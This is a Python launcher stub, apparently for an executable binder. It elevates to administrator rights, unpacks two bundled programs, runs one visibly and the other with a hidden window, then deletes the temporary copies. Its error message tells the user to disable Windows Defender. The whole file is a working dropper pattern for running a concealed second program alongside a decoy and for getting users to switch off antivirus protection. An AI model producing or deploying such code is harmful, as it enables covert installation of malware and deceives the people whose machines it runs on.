import subprocess
import PyElevate
import tempfile
import shutil
import ctypes
import json
import sys
import os

PyElevate.elevate()
if not PyElevate.elevated():
    ctypes.windll.user32.MessageBoxW(0, "Please run as administrator.", "Permissions error", 0x10)
    sys.exit(0)

if getattr(sys, 'frozen', False):
    base_path = sys._MEIPASS
else:
    exit("Please run this script as a bundled executable.")

try:
    with open(os.path.join(base_path, 'bundle_meta.json')) as f:
        meta = json.load(f)

    main = meta.get('main')
    secondary = meta.get('secondary')

    temp_exec_dir = tempfile.mkdtemp(prefix="exebundle_")
    main_path = os.path.join(temp_exec_dir, main)
    secondary_path = os.path.join(temp_exec_dir, secondary)

    shutil.copy2(os.path.join(base_path, main), main_path)
    shutil.copy2(os.path.join(base_path, secondary), secondary_path)
    
    p1 = subprocess.Popen(main_path, shell=True)
    p2 = subprocess.Popen([secondary_path, "--hidewindow"], shell=True)

    p1.wait()
    p2.wait()

    shutil.rmtree(temp_exec_dir, ignore_errors=True)

except Exception as e:
    ctypes.windll.user32.MessageBoxW(0, "An unknown error has occurred\nYou can try disabling Windows Defender and running the app again.", "Error", 0x10)
    
sys.exit(0)